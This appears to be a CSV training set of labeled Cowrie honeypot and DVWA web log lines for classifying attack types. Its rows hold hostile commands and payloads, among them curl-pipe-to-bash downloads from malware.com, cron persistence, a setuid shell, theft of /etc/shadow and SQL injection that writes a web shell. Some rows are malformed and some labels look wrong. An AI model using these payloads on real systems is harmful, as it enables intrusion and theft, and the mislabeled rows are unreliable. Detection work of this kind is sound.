text,label
"source:DVWA event:LOGIN ip:103.52.13.31 password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie ip:203.199.221.254 username:jenkins password:login command:- request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:172.25.106.238 username:- password:- command:curl -s http://192.168.1.100/payload | bash request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:103.61.144.123 password:123123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.150.238 username:sshd password:dragon command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.165.68 username:- password:- command:(crontab -l; echo '*/5 * * * * /tmp/bot.sh') | crontab - request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+extractvalue%281%2cconcat%280x7e%2cversion%28%29%29%29+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:185.61.195.237 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA ip:192.168.244.137 event:LOGIN username:- password:- command:- request:""POST HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:192.168.58.44 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fnet%2ftcp HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.failed ip:103.190.7.10 username:jenkins password:admin command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:185.33.163.165 username:- password:- command:- /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+schema_name,null+FROM+information_schema.schemata--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:91.121.156.74 username:- password:- command:find / -writable 2>/dev/null,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.51.177 password:raspberry username:nginx command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:203.108.155.146 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:185.235.182.36 username:grafana password:password123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ps aux request:-,SSH_COMMAND-COWRIE
source:cowrie ip:192.168.51.136 username:zabbix password:admin123 command:- request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:103.196.208.178 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3buname+-a&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
"source:DVWA event:RECON ip:45.56.15.125 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fcmdline HTTP/1.1""",CMD_INJECTION-DVWA
"source:DVWA event:SQLi ip:172.23.63.131 password:- username:- request:""GET /dvwa/vulnerabilities/sqli/?id='+WAITFOR+DELAY+'0:0:5'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:10.48.114.94 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:10.229.230.10 username:bin password:dragon command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:10.138.247.160 username:zabbix password:vagrant command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:203.90.190.234 username:- password:- command:curl http://malware.com/bot -o request:-,SSH_COMMAND-COWRIE
source:cowrie ip:10.90.110.124 username:- password:- command:scp attacker@10.0.0.1:/tmp/ /tmp/loot.zip request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:10.133.245.71 username:gnats password:iloveyou command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:185.135.142.79 username:- password:- command:env request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.28.123 username:- password:- command:apt-get install -y netcat request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:172.22.151.158 username:- password:- command:logout request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:103.47.107.74 username:mongodb password:hello123 command:- request:-,SSH_SUCCESS-COWRIE
event:cowrie.login.failed ip:103.248.57.236 username:gnats password:admin@123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:185.201.215.219 username:- password:- command:cat /proc/cpuinfo request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.68.29 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:45.253.16.225 username:- password:- command:cat ~/.ssh/authorized_keys request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:185.119.236.10 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+(SELECT+COUNT(*)+FROM+users)>0--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:172.17.219.22 username:postgres password:letmein command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:203.251.127.36 username:- password:- command:cat /proc/cpuinfo request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:45.215.61.43 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:10.163.90.213 password:master command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 command:- password:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:172.23.65.84 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:192.168.104.65 username:prometheus password:test command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep%285%29+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:203.144.1.142 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fhome%2fphil%2f.bash_history HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:203.46.102.109 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fcmdline",CMD_INJECTION-DVWA
"source:DVWA event:LOGIN ip:45.135.209.121 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:45.83.253.69 username:backup password:admin@123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:10.26.24.73 username:ansible password:000000 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:192.168.98.161 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+OR+2%3e1&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.98.250 username:- password:- command:whoami request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:45.99.236.234 username:vault password:pass@123 command:- request:-,SSH_SUCCESS-COWRIE
"event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.client.version ip:193.60.25.244 username:- password:- command:- request:SSH-2.0-OpenSSH,RECON-COWRIE
source:cowrie event:cowrie.command.input ip:91.87.139.242 username:- password:- command:ls -la /var/www request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:uname -a request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:185.40.167.159 username:- password:- command:netstat -antp request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:df request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:185.32.117.52 username:- password:- command:- request:""GET /dvwa/setup.php HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:185.142.252.81 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:45.209.212.198 username:ftpuser password:vagrant command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:91.156.95.231 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3bcat+/etc/passwd&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
"source:DVWA event:LOGIN ip:91.204.235.130 username:- password:- command:- HTTP/1.1"" /dvwa/login.php",RECON-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input username:- ip:192.168.244.137 password:- command:cat /etc/passwd request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:45.118.230.204 username:- password:- command:iptables -P INPUT ACCEPT request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed username:git password:dietpi command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:10.242.116.134 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:172.21.139.63 username:mysql password:pass@123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:10.252.234.144 username:ubuntu password:toor command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:103.141.121.165 username:- password:- command:cat ~/.ssh/authorized_keys request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.170.52 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:103.142.6.163 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- request:""GET command:- /dvwa/vulnerabilities/sqli/?id=1+OR+2%3e1&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:45.48.76.222 password:default command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.failed ip:192.168.123.75 username:list password:admin@123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie ip:10.113.28.225 event:cowrie.command.input username:- password:- command:find / -perm -4000 2>/dev/null request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=admin+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:91.8.210.110 username:- password:- command:uname -a request:-,SSH_COMMAND-COWRIE
"event:SQLi source:DVWA ip:192.168.226.167 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;EXEC+xp_cmdshell('whoami')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:91.181.253.145 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:91.31.91.159 username:- password:- command:base64 -d <<< 'bWFsd2FyZQ==' | bash request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.145.65 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:172.24.162.173 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+schema_name,null+FROM+information_schema.schemata--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:91.200.34.83 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:103.9.233.82 username:- password:- command:zip -r /tmp/loot.zip /etc/passwd /etc/shadow request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=admin+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat /etc/resolv.conf request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.client.version ip:31.99.49.157 username:- password:- command:- request:SSH-2.0-OpenSSH,RECON-COWRIE
source:cowrie event:cowrie.login.success ip:91.9.206.53 username:bin password:password123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:10.184.170.103 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1;SELECT+*+FROM+users--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:172.18.228.234 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls -la /tmp request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input username:- password:- command:lastlog request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:10.208.254.101 username:nomad password:123abc command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:192.168.54.12 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA ip:192.168.166.22 event:SQLi username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:185.177.104.64 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:185.167.5.158 username:- password:- command:ls -la / request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:baseball command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:recon ip:165.151.96.93 username:- password:- command:- request:-,RECON-COWRIE
source:cowrie event:cowrie.login.success ip:185.205.229.213 password:root username:test command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat /etc/passwd request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:91.191.54.99 username:sshd password:toor command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:103.245.41.210 username:- password:- command:cp /bin/bash /tmp/.hidden_bash && chmod +s /tmp/.hidden_bash request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:91.29.20.183 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:103.169.141.17 username:- password:- command:echo '* * * * * root /tmp/bot.sh' >> /etc/crontab request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:45.33.200.249 username:bin password:pass@123 command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls /var request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:203.205.215.184 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.188.72 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- HTTP/1.1"" request:""POST",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:192.168.7.199 username:hadoop password:vagrant command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:LOGIN ip:172.16.224.191 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:192.168.129.128 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:203.218.5.93 username:- password:- command:ps aux request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:172.30.205.230 username:games password:654321 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:guest command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:RECON ip:45.129.85.224 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fproc%2fself%2fcmdline HTTP/1.1""",CMD_INJECTION-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:172.16.134.220 username:- password:- command:- request:""GET /dvwa/phpinfo.php HTTP/1.1""",RECON-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+extractvalue%281%2cconcat%280x7e%2cversion%28%29%29%29+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:91.46.250.51 username:- password:- command:chmod +x bot.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:203.249.195.224 username:- password:- command:printenv request:-,SSH_COMMAND-COWRIE
source:cowrie ip:103.40.134.254 username:consul password:000000 command:- request:-,SSH_COMMAND-COWRIE
event:cowrie.command.input ip:91.90.179.84 username:- password:- command:uname -a request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:103.56.182.135 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3bINSERT+INTO+users(user,password)+VALUES('h4x','h4x')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:103.164.233.141 username:- password:- command:ftp -n 10.0.0.5 <<< $'user anonymous\nget shell.sh' request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:91.16.208.7 username:- password:- command:- /dvwa/setup.php HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:45.183.243.71 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:172.21.202.246 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2,3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+2+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.112.68 username:- password:- command:history request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:10.154.47.64 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:find /var -name '*.log' request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:172.18.196.87 username:deploy password:monkey command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:172.18.233.27 username:sshd password:welcome command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+table_name%2cnull+FROM+information_schema.tables+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- /etc/hosts request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:203.136.63.247 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:10.136.162.49 username:jenkins password:welcome1 command:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:45.10.122.105 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA username:- event:LOGIN password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:recon ip:86.71.162.135 username:- password:- command:- request:-,RECON-COWRIE
"source:DVWA event:SQLi ip:91.209.1.117 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+INTO+OUTFILE+'/var/www/html/shell.php'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"event:SQLi ip:10.130.213.43 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:10.93.212.83 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:rockyou command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.244.137 username:root password:ubuntu command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:103.157.183.80 username:- password:- command:cat /proc/cpuinfo request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN username:- password:- command:- request:""POST HTTP/1.1"" /dvwa/login.php",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:45.3.18.236 username:- password:- command:netstat -antp request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:91.52.155.115 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli_blind/?id=1+AND+1=1--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:10.24.242.80 username:- password:- command:crontab -e request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:172.20.200.168 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:103.109.93.234 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3bINSERT+INTO+users(user,password)+VALUES('h4x','h4x')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:103.21.159.141 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli_blind/?id=1+AND+1=1--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.45.55 username:- command:find /etc -name '*.conf' 2>/dev/null request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls /tmp request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:185.253.95.235 username:- password:- command:cat /etc/passwd request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 password:- username:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep%285%29+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:172.29.162.140 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat /etc/passwd request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:91.191.240.211 password:admin username:test request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:45.186.154.64 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+load_file('/etc/passwd'),null--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null%2cnull+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:45.197.102.176 username:elastic password:123456 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.login.success ip:172.31.24.86 username:nomad password:vagrant command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:185.192.42.173 username:- -a password:- request:-,SSH_COMMAND-COWRIE
